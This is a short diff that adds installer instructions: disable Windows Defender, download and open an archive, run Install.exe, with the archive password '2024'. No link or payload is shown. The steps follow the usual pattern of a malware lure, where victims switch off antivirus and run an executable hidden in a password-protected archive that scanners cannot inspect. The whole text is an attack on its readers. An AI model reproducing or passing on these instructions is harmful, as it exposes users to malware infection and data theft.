@@ -1,0 +1,7 @@
+Disable windows defender 
+Download the archive
+Open the archive 
+Run Install.exe
+Enjoy
+
+Archive Password: 2024
